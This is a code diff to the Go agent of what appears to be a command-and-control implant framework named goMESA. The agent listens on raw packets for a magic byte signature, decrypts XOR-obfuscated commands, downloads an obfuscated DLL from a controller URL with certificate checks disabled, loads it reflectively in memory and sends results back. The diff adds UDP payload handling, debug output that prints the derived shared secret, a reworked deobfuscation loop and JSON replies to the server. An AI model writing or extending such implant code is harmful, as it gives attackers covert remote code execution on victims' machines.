@@ -9,10 +9,12 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
 	"goMESA/internal/agent_env"
 	"goMESA/internal/common"
 	"goMESA/internal/reflective"
-	"golang.org/x/sys/windows"
 	"io/ioutil"
 	"log"
 	"net"
@@ -20,12 +22,7 @@ import (
 	"os"
 	"os/exec"
 	"strings"
-	"syscall"
 	"time"
-	"unsafe"
-
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/pcap"
 )
 
 var serverIP string
@@ -211,11 +208,12 @@ func startSniffer() {
 
 	// Process packets
 	for packet := range packetSource.Packets() {
+
 		// Get complete raw packet data
 		packetData := packet.Data()
 		log.Printf("DEBUG-PACKET-1: Received packet with %d bytes", len(packetData))
 
-		// First, try to extract application layer data if possible
+		// First attempt: try the application layer
 		var payloadToCheck []byte
 		appLayer := packet.ApplicationLayer()
 		if appLayer != nil {
@@ -225,6 +223,21 @@ func startSniffer() {
 			// If there's no application layer, use the entire packet
 			payloadToCheck = packetData
 			log.Printf("DEBUG-PACKET-2: No application layer, using entire packet")
+		}
+
+		// If application layer payload is empty but we have a UDP layer, get directly from that
+		if len(payloadToCheck) == 0 {
+			if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
+				udp, _ := udpLayer.(*layers.UDP)
+				payloadToCheck = udp.Payload
+				log.Printf("DEBUG-PACKET-2B: Using UDP layer payload instead: %d bytes", len(payloadToCheck))
+			}
+		}
+
+		// If we still have no payload data, try the entire packet as last resort
+		if len(payloadToCheck) == 0 {
+			payloadToCheck = packetData
+			log.Printf("DEBUG-PACKET-2C: No payload found in layers, using entire packet")
 		}
 
 		// Search for our signature pattern 0x1a, 0x01, 0x0a, 0xf0 anywhere in the packet
@@ -338,7 +351,7 @@ func startSniffer() {
 			}
 
 		case common.CommandWebConnect:
-			log.Printf("DEBUG-COMMAND-20: Received web connect command")
+			log.Printf("WEBCON-DEBUG-10: Received web connect command")
 
 			// Extract the payload data (JSON format)
 			if len(payloadToCheck) <= dataIndex {
@@ -348,7 +361,7 @@ func startSniffer() {
 
 			// Get the web connect command data
 			payloadData := string(bytes.Trim(common.XORDecrypt(payloadToCheck[dataIndex:], '.'), "\x00"))
-			log.Printf("DEBUG-COMMAND-22: Web connect payload: %s", payloadData)
+			log.Printf("WEBCON-DEBUG-12: Web connect payload: %s", payloadData)
 
 			// Parse the JSON payload
 			var webConnectPayload common.WebConnectPayload
@@ -356,6 +369,8 @@ func startSniffer() {
 				log.Printf("DEBUG-COMMAND-23: Failed to parse web connect payload: %v", err)
 				continue
 			}
+
+			log.Printf("WEBCON-DEBUG-14: Connecting to server URL: %s", webConnectPayload.ServerURL)
 
 			// Execute the web connect command in a separate goroutine
 			go executeWebConnect(webConnectPayload)
@@ -406,6 +421,8 @@ func verifyPEChecksumValue(seed uint32) string {
 func generatePEValidationKey() string {
 	alignmentSignature := getPESectionAlignmentString()
 	checksumSignature := verifyPEChecksumValue(PE_CHECKSUM_SEED)
+	result := alignmentSignature + checksumSignature
+	fmt.Printf("AGENT-KEY-DEBUG: Generated shared secret: % x\n", []byte(result))
 	return alignmentSignature + checksumSignature
 }
 
@@ -432,11 +449,14 @@ func deobfuscatePayload(data []byte, key string) ([]byte, PayloadMetadata, error
 
 	// Extract metadata length from first 4 bytes (unencrypted)
 	metadataLen := binary.LittleEndian.Uint32(data[0:4])
+	fmt.Printf("DEOBFUSCATE-DEBUG-1: Metadata length from header: %d\n", metadataLen)
 
 	// Sanity check the metadata length
 	if metadataLen > 1024 || 4+metadataLen > uint32(len(data)) {
 		return nil, PayloadMetadata{}, fmt.Errorf("invalid metadata length: %d", metadataLen)
 	}
+
+	fmt.Printf("DEOBFUSCATE-DEBUG-2: Derived key for deobfuscation: %q\n", key)
 
 	// Create result buffer for deobfuscated data
 	result := make([]byte, len(data)-4)
@@ -444,20 +464,25 @@ func deobfuscatePayload(data []byte, key string) ([]byte, PayloadMetadata, error
 	keyLen := len(keyBytes)
 
 	// Deobfuscate everything after the length field
-	for i := 0; i < len(result); i++ {
-		// Calculate rolling key byte (must match server algorithm)
-		keyByte := keyBytes[i%keyLen] ^ byte((i+4)&0xFF)
+	for i := 4; i < len(data); i++ {
+		// Use the exact same index i as server would have used when encrypting
+		keyByte := keyBytes[(i)%keyLen] ^ byte(i&0xFF)
 
-		// XOR to deobfuscate
-		result[i] = data[i+4] ^ keyByte
+		// Store at adjusted position in result
+		result[i-4] = data[i] ^ keyByte
 	}
 
 	// Extract and parse metadata
 	metadataBytes := result[:metadataLen]
+	fmt.Printf("DEOBFUSCATE-DEBUG-3: Raw metadata bytes: % x\n", metadataBytes[:min(len(metadataBytes), 64)])
+	fmt.Printf("DEOBFUSCATE-DEBUG-4: Deobfuscated metadata as string: %q\n", string(metadataBytes))
+
 	var metadata PayloadMetadata
 	if err := json.Unmarshal(metadataBytes, &metadata); err != nil {
 		return nil, PayloadMetadata{}, fmt.Errorf("failed to parse metadata: %v", err)
 	}
+
+	fmt.Printf("DEOBFUSCATE-DEBUG-5: Successfully parsed metadata: %+v\n", metadata)
 
 	// Return the actual payload (everything after metadata)
 	return result[metadataLen:], metadata, nil
@@ -469,6 +494,8 @@ func executeWebConnect(payload common.WebConnectPayload) {
 
 	// Create a response message to send back to the server
 	var responseMsg string
+
+	var success bool
 
 	// Download and deobfuscate the payload
 	dllBytes, metadata, err := downloadPayload(payload.ServerURL)
@@ -498,6 +525,33 @@ func executeWebConnect(payload common.WebConnectPayload) {
 	responsePacket := common.NewOutputPacket(agent.ServerIP.String(), responseMsg)
 
 	// Send the response
+	// Format the response as JSON
+	responseData := map[string]interface{}{
+		"success": err == nil && success,
+	}
+
+	if err != nil {
+		responseData["message"] = fmt.Sprintf("Failed to load DLL: %v", err)
+	} else if success {
+		responseData["message"] = fmt.Sprintf("Successfully executed function %s", metadata.FunctionName)
+	} else {
+		responseData["message"] = fmt.Sprintf("Function %s executed but returned FALSE", metadata.FunctionName)
+	}
+
+	// Convert to JSON
+	responseJSON, err := json.Marshal(responseData)
+	if err != nil {
+		log.Printf("Error marshaling response: %v", err)
+		responseMsg = fmt.Sprintf("Error formatting response: %v", err)
+	} else {
+		responseMsg = "ReflectiveLoading:" + string(responseJSON)
+	}
+
+	// Send the response back to the server
+	log.Printf("Sending response for web connect command")
+	responsePacket = common.NewOutputPacket(agent.ServerIP.String(), responseMsg)
+
+	// Send the response
 	if err := responsePacket.ChunkAndSendOutput(); err != nil {
 		log.Printf("Error sending web connect response: %v", err)
 	} else {
@@ -507,7 +561,7 @@ func executeWebConnect(payload common.WebConnectPayload) {
 
 // downloadPayload downloads and processes the payload from the server
 func downloadPayload(serverURL string) ([]byte, PayloadMetadata, error) {
-	fmt.Printf("[+] Connecting to server: %s\n", serverURL)
+	fmt.Printf("DOWNLOAD-DEBUG-1: Connecting to server: %s\n", serverURL)
 
 	// Create HTTP client with TLS config (skip verification for simplicity)
 	tr := &http.Transport{
@@ -561,7 +615,9 @@ func downloadPayload(serverURL string) ([]byte, PayloadMetadata, error) {
 		return nil, PayloadMetadata{}, fmt.Errorf("failed to read response body: %v", err)
 	}
 
-	fmt.Printf("[+] Downloaded %d bytes of obfuscated payload\n", len(obfuscatedData))
+	// After retrieving the content:
+	fmt.Printf("DOWNLOAD-DEBUG-2: Downloaded %d bytes\n", len(obfuscatedData))
+	fmt.Printf("DOWNLOAD-DEBUG-3: First 20 bytes: % x\n", obfuscatedData[:min(20, len(obfuscatedData))])
 
 	// Generate shared secret
 	sharedSecret := generatePEValidationKey()
@@ -576,8 +632,10 @@ func downloadPayload(serverURL string) ([]byte, PayloadMetadata, error) {
 		return nil, PayloadMetadata{}, fmt.Errorf("failed to deobfuscate payload: %v", err)
 	}
 
-	fmt.Printf("[+] Successfully deobfuscated %d bytes of DLL data\n", len(dllBytes))
 	fmt.Printf("[+] Target function: %s\n", metadata.FunctionName)
+
+	fmt.Printf("DOWNLOAD-DEBUG-4: Deobfuscated payload metadata: %+v\n", metadata)
+	fmt.Printf("DOWNLOAD-DEBUG-5: Deobfuscated DLL size: %d bytes\n", len(dllBytes))
 
 	return dllBytes, metadata, nil
 }
